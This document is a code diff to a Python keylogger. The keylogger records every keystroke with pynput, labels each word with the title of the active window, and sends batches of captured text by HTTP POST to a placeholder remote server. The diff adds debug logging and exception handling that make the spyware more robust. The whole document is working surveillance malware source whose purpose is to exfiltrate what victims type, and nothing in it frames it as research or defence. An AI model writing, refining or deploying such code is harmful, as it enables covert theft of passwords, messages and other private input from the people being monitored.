@@ -2,18 +2,25 @@ import logging
 import requests
 from pynput.keyboard import Key, Listener
 import os
-import subprocess
 import threading
 import time
 from win32gui import GetWindowText, GetForegroundWindow
+
+# Configuring the logger to also log to console for debugging
+logging.basicConfig(
+    filename="keylog.txt",
+    level=logging.DEBUG,
+    format='%(asctime)s: %(levelname)s: %(message)s',
+    handlers=[
+        logging.FileHandler("keylog.txt"),
+        logging.StreamHandler()  # Log to console
+    ]
+)
 
 # File for local keylogging
 log_file = "keylog.txt"
 # URL of the server to send key logs
 server_url = 'http://<your_server_ip>:8080/log'  # Replace with your actual server IP and port
-
-# Configuring the logger
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 # Word buffer to accumulate characters into words
 word_buffer = []
@@ -23,24 +30,32 @@ context_buffer = []
 # Send logs to the server
 def send_logs(data):
     try:
+        logging.debug(f"Attempting to send logs: {data}")
         response = requests.post(server_url, data={'key': data}, timeout=10)
         if response.status_code != 200:
-            logging.error(f"Failed to send log: {response.status_code}")
+            logging.error(f"Failed to send log: HTTP {response.status_code}")
+        else:
+            logging.debug("Logs sent successfully.")
     except requests.exceptions.RequestException as e:
-        logging.error(f"Failed to send log: {e}")
+        logging.error(f"Failed to send log due to request exception: {e}")
+    except Exception as e:
+        logging.error(f"Unexpected error in send_logs: {e}")
 
 # Function to handle word completion
 def on_word_completed(word):
     global word_buffer
-    active_window = GetWindowText(GetForegroundWindow())  # Get active window title
-    word_with_context = f"{active_window}: {word}\n"
-    word_buffer.append(word_with_context)
-    logging.info(word_with_context)
+    try:
+        active_window = GetWindowText(GetForegroundWindow())  # Get active window title
+        word_with_context = f"{active_window}: {word}\n"
+        word_buffer.append(word_with_context)
+        logging.info(f"Word logged: {word_with_context}")
 
-    if len(word_buffer) >= buffer_size:
-        logs_to_send = ''.join(word_buffer)
-        send_logs(logs_to_send)
-        word_buffer = []
+        if len(word_buffer) >= buffer_size:
+            logs_to_send = ''.join(word_buffer)
+            send_logs(logs_to_send)
+            word_buffer = []
+    except Exception as e:
+        logging.error(f"Error in on_word_completed: {e}")
 
 # Event handler for key press
 def on_press(key):
@@ -73,9 +88,16 @@ def on_press(key):
 
 # Run the keylogger in the background
 def run_keylogger():
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+    logging.info("Starting keylogger...")
+    try:
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    except Exception as e:
+        logging.error(f"Error in run_keylogger: {e}")
 
 if __name__ == "__main__":
-    # Start the keylogger
-    run_keylogger()
+    try:
+        logging.info("Keylogger is now running...")
+        run_keylogger()
+    except Exception as e:
+        logging.critical(f"Critical failure in main block: {e}")
